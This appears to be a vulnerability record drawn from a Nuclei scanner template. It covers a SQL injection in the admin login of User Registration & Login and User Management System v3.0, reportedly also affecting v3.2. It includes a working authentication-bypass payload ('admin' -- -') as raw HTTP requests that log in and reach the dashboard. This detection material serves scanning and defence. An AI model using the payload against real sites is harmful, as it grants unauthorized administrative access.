# Vulnerability: User Management/Registration & Login v3.0 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`user-management-system-sqli.yaml`)

## Description
User Registration & Login and User Management System v3.0 admin panel has SQL vulnerability. Even though the person who discovered the vulnerability tested it in version 3.0, version 3.2 also contains the same vulnerability. It can be exploited by entering "admin' -- -" as the username parameter in the admin panel.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /admin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=admin%27+--+-&password=whatever&login=

GET /admin/dashboard.php HTTP/1.1
Host: {{Hostname}}
```

